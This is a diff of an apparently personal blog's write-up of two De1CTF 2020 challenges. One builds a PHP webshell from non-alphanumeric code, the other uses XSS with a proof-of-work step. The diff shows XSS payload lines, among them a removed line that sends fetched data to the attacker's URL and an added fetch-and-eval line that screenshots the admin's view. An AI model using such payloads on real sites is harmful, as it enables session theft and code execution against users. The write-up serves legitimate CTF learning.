@@ -46,14 +46,16 @@
 <meta itemprop="description" content="The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action.">
 <meta itemprop="datePublished" content="2020-05-07T15:20:38-06:00" />
 <meta itemprop="dateModified" content="2020-05-07T15:20:38-06:00" />
-<meta itemprop="wordCount" content="1717">
-<meta itemprop="image" content="https://jamvie.net"/>
+<meta itemprop="wordCount" content="1810">
+<meta itemprop="image" content="https://jamvie.net/img/AnimalCrossing.jpg">
+<meta itemprop="image" content="https://jamvie.net/images/DE1CTF01.png">
+<meta itemprop="image" content="https://jamvie.net/images/DE1CTF02.png">
 
 
 
 <meta itemprop="keywords" content="writeups," />
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://jamvie.net"/>
+<meta name="twitter:image" content="https://jamvie.net/img/AnimalCrossing.jpg"/>
 
 <meta name="twitter:title" content="De1ctf 2020: Hard_Pentest_1 and Animal Crossing"/>
 <meta name="twitter:description" content="The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action."/>
@@ -64,7 +66,9 @@
 <meta property="og:description" content="The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://jamvie.net/post/05de1ctf2020_01/" />
-<meta property="og:image" content="https://jamvie.net"/>
+<meta property="og:image" content="https://jamvie.net/img/AnimalCrossing.jpg" />
+<meta property="og:image" content="https://jamvie.net/images/DE1CTF01.png" />
+<meta property="og:image" content="https://jamvie.net/images/DE1CTF02.png" />
 <meta property="article:published_time" content="2020-05-07T15:20:38-06:00" />
 <meta property="article:modified_time" content="2020-05-07T15:20:38-06:00" />
 
@@ -92,7 +96,7 @@
     <div class="logo">
         
             <span class="logo__mark">></span>
-            <span class="logo__text">$ cd /hello/world</span>
+            <span class="logo__text">$ echo hello</span>
             <span class="logo__cursor" style=
                   "
                    
@@ -249,22 +253,22 @@ A
 <p>What does this mean for us?</p>
 <p>Because of the <code>Check()</code> function, we can&rsquo;t use alphanumerics or certain special characters. But for the list of valid special characters, <code>[]</code> square brackets are allowed, so we can declare arrays as normal. And we can still declare variables as usual, and the <code>+</code> operators are still valid so we can utilize string arithmetic.</p>
 <p>So, all in all, if we wanted to spell the word <code>GET</code> with all the restrictions above, it would look like</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>[] <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=@</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$_</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>$_[<span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;@&#39;</span>] <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $___<span style="color:#f92672">=</span>$_ <span style="color:#75715e">?&gt;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>[] <span style="color:#75715e">?&gt;</span>            //Declare array
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=@</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$_</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">?&gt;</span>         //array is converted to a string, &#34;Array&#34;
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>$_[<span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;@&#39;</span>] <span style="color:#75715e">?&gt;</span>  //Access first element in array. The &#39;!&#39;==&#39;@&#39; check returns 0
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $___<span style="color:#f92672">=</span>$_ <span style="color:#75715e">?&gt;</span>          //&#39;A&#39;
 
 <span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
 <span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>   
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">=</span> $__ <span style="color:#75715e">?&gt;</span>  \\G     
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">=</span> $__ <span style="color:#75715e">?&gt;</span>   //&#39;G&#39;     
 
 <span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>    \\E
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__ <span style="color:#75715e">?&gt;</span>
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>    //&#39;E&#39;
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__ <span style="color:#75715e">?&gt;</span>                           //&#39;GE&#39;
 
 <span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>   \\T
-<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__  <span style="color:#75715e">?&gt;</span> \\GET
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>   //&#39;T&#39;
+<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__  <span style="color:#75715e">?&gt;</span> //&#39;GET&#39;
 </code></pre></div><p>Armed with this knowledge, we can write out entire lines of code of php that are just a series of various shorthand operators and symbols, and string arithmetic.</p>
 <p>The first hurdle is the existence of the php opening tag. All php code requires the <code>&lt;?php</code> opening tag before anything, kinda like the start of any HTML document needing <code>&lt;HTML&gt;</code> to be declared first at the top.</p>
 <p>Checking out php open tags, we come across the existence of shorthand tags for them, in the <a href="https://www.php.net/manual/en/language.basic-syntax.phptags.php">PHP documentation</a>:</p>
@@ -278,6 +282,7 @@ A
 But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a shell on the server, but the scope of my pwn abilities isn&rsquo;t much to really comprehend what&rsquo;s going on here. Unfortunately, this challenge will remain unsolved until I can figure out how to play around with a Microsoft webshell.</p>
 <hr>
 <h2 id="animal-crossing">Animal Crossing</h2>
+<p>I unfortunately figured this problem out shortly after the CTF. Just my luck.</p>
 <p>Despite the few solves this problem has, I was drawn to it because of its name. Who doesn&rsquo;t love Animal Crossing?</p>
 
     <img src="https://jamvie.net/images/DE1CTF01.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
@@ -291,7 +296,7 @@ But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a sh
 
 
 <p>I thought my client broke for a second. I wasn&rsquo;t expecting just plain code to be printed on the front-end.</p>
-<p>It stumped me at first - the ability to report is blocked by this md5 code checking function. I needed to input some string whose md5 encoding&rsquo;s first 6 characters matched the randomized string. I didn&rsquo;t actually get what this was supposed to be doing, I was confused as to wether or not this was still a broken webpage or not, and I asked my team for help. Luckily, my teammate Filip, who&rsquo;s really good at pwn-based challenges, told me it was a &ldquo;proof of work&rdquo; - I just needed to brute-force my way in by finding a string with the md5 hash characters matching the random one. He gave me a script I could work with to start cracking it.</p>
+<p>It stumped me at first - the ability to report is blocked by this md5 code checking function. I needed to input some string whose md5 encoding&rsquo;s first 6 characters matched the randomized string. I didn&rsquo;t actually get what this was supposed to be doing, I was conSfused as to wether or not this was still a broken webpage or not, and I asked my team for help. Luckily, my teammate Filip, who&rsquo;s really good at pwn-based challenges, told me it was a &ldquo;proof of work&rdquo; - I just needed to brute-force my way in by finding a string with the md5 hash characters matching the random one. He gave me a script I could work with to start cracking it.</p>
 <p>The good thing (in this context, bad for others) about md5 is that it&rsquo;s a one-way hashing but there is no salting to the code value, it&rsquo;s just the hash. Therefore, a string put through md5 would always return the same md5 encoding. So I just needed to randomly generate a string, md5 it, then check the digest against the random one.</p>
 <p>Well great, I have succesfully done so and reported my passport to an admin. With this extra step of generating a valid code, the rest of Animal Crossing is a general XSS attack.</p>
 <p>We want to report a URL that will grab the admin cookie when a user checks out our URL, and sends it to the server. Part of my payload looks like this:</p>
@@ -302,9 +307,11 @@ But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a sh
 <p>Eventually, De1CTF released a hint: &ldquo;what is the admin doing?&rdquo;</p>
 <p>Looking at the document shows hundreds of png images, of what looks like other people&rsquo;s passports. I guess, the other half of the flag is among them. But the hint got me thinking - obviously, the admin would have to be leafing through the screenshots but its not like the flag will just magically turn up in one of the images cause they forgot to hide their flag text file out of view. So unless I can control the screenshot, I doubt I&rsquo;ll be able to find the flag.</p>
 <p>The library &lsquo;<a href="https://html2canvas.hertzen.com/">html2canvas</a>&rsquo; comes to mind - taking screenshots with javascript. If I pass a payload to the admin that takes a screenshot of their interface, will the flag be there?</p>
-<p>With this in mind, I crafted a payload that would take a screenshot of the admin&rsquo;s screen, then send that to me, basically (similar to my catweb writeup albeit with a slightly different function):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/static/images/xxxxxxxxx.png`</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span><span style="color:#f92672">+</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;Nothing&#39;</span>)));
-</code></pre></div><p>I create this and report it to the admin. When the admin visits the URL with the javascript payload, it will take a screenshot of the admin&rsquo;s interface and sends it back to my server. I get the address and download it for the other half of the flag:</p>
+<p>The idea here is to upload some code using html2canvas. If we give it a .png extension the server won&rsquo;t complain, after which you can fetch your image back, whatever you called it, and evaluate it so it takes the screenshot and you can download it. Your code should import the html2canvas library, take a screenshot, then upload that screenshot to the server for you to fetch and download.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/static/images/WhateverYouNamedYourFile.png`</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;eval((<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;0 + 0&#39;</span>));
+
+<span style="color:#75715e">//0+0 check is my way of checking errors. If the fetch response evals to a 0 I did something wrong.
+</span></code></pre></div><p>I create this and report it to the admin. When the admin visits the URL with the javascript payload (not shown here), it will take a screenshot of the admin&rsquo;s interface and send it back to me. I get the address and download it for the other half of the flag:</p>
 <p><code>cool_GamE}</code></p>
 <p>So the full flag would be: <code>FLAG=De1CTF{I_l1k4_cool_GamE}</code></p>
 <p>This was definitely a challenge that stretched my capabilities of XSS attacks past grabbing cookies and pretending to be admin. The 2nd half of taking a screenshot of the admin&rsquo;s interface was unique and certainly not something I would&rsquo;ve thought of immediately. All in all, I&rsquo;m glad I participated in DE1CTF despite the difficulty levels of the problems I faced!</p>
